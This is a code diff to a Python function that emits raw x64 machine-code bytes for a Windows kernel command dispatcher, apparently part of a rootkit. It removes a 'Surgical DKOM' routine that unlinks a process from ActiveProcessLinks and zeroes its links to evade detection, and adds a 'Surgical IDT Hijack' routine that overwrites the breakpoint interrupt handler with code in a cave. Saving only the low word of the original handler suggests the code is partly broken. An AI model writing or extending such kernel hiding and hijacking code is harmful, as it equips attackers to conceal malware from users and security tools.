@@ -84,33 +84,39 @@ def construct_dispatcher_stub(mm_copy_addr=0):
         0x74, 0x4A,                                 # je cmd_ark_scan
         0x83, 0xF8, 0x07,                           # cmp eax, 7 (Surgical DKOM - Unlink Process)
         0x74, 0x5C,                                 # je cmd_dkom
-        0xEB, 0x6E,                                 # jmp clear_cmd
+        0x83, 0xF8, 0x08,                           # cmp eax, 8 (Surgical IDT Hijack)
+        0x74, 0x76,                                 # je cmd_idt
+        0xEB, 0x88,                                 # jmp clear_cmd
         
         # ... (other commands) ...
 
-        # Command 0x07: Surgical DKOM - Unlink Process from ActiveProcessLinks
-        # Arg1: EPROCESS KVA
-        # cmd_dkom:
+        # Command 0x08: Surgical IDT Hijack
+        # Arg1: IDT Base (from idt_research.py)
+        # Arg2: Our Cave VA (CAVE_VA)
+        # cmd_idt:
         0x48, 0x8B, 0xCB,                           # mov rbx, rcx (Mailbox VA)
-        0x48, 0x8B, 0x53, 0x10,                     # mov rdx, [rbx + 0x10] (EPROCESS KVA)
+        0x48, 0x8B, 0x4B, 0x10,                     # mov rcx, [rbx + 0x10] (IDT Base)
+        0x48, 0x8B, 0x53, 0x18,                     # mov rdx, [rbx + 0x18] (New Handler VA)
         
-        # ActiveProcessLinks is at EPROCESS + 0x448 (Win11 22H2+)
-        # Offset might need dynamic resolution, but we'll use 0x448 for this demo.
-        0x48, 0x8D, 0x92, 0x48, 0x04, 0x00, 0x00,   # lea rdx, [rdx + 448h] (LIST_ENTRY)
+        # Target IDT Entry 3 (Breakpoint)
+        # Each entry is 16 bytes. Index 3 is at offset 0x30.
+        0x48, 0x83, 0xC1, 0x30,                     # add rcx, 30h
         
-        # Unlink: 
-        # Flink = Entry->Flink
-        # Blink = Entry->Blink
-        # Flink->Blink = Blink
-        # Blink->Flink = Flink
-        0x48, 0x8B, 0x02,                           # mov rax, [rdx] (Flink)
-        0x48, 0x8B, 0x4A, 0x08,                     # mov rcx, [rdx+8] (Blink)
-        0x48, 0x89, 0x48, 0x08,                     # mov [rax+8], rcx (Flink->Blink = Blink)
-        0x48, 0x89, 0x01,                           # mov [rcx], rax (Blink->Flink = Flink)
+        # IDT Entry x64 Layout:
+        # 0x00-0x01: Offset Low
+        # 0x06-0x07: Offset Middle
+        # 0x08-0x0B: Offset High
         
-        # Zero out the links in the target to prevent double-unlinking/detection
-        0x48, 0xC7, 0x02, 0x00, 0x00, 0x00, 0x00,   # mov qword ptr [rdx], 0
-        0x48, 0xC7, 0x42, 0x08, 0x00, 0x00, 0x00, 0x00, # mov qword ptr [rdx+8], 0
+        # Store original handler in mailbox for safety
+        0x0F, 0xB7, 0x01,                           # movzx eax, word ptr [rcx] (Low)
+        0x48, 0x89, 0x43, 0x38,                     # mov [rbx + 0x38], rax (Part 1)
+        
+        # Patch with New Handler (rdx)
+        0x66, 0x89, 0x11,                           # mov [rcx], dx (Low 16)
+        0x48, 0xC1, 0xEA, 0x10,                     # shr rdx, 16
+        0x66, 0x89, 0x51, 0x06,                     # mov [rcx+6], dx (Mid 16)
+        0x48, 0xC1, 0xEA, 0x10,                     # shr rdx, 16
+        0x89, 0x51, 0x08,                           # mov [rcx+8], edx (High 32)
         
         0xC7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rbx + 0x04], 0
         0xEB, 0x06,                                 # jmp clear_cmd
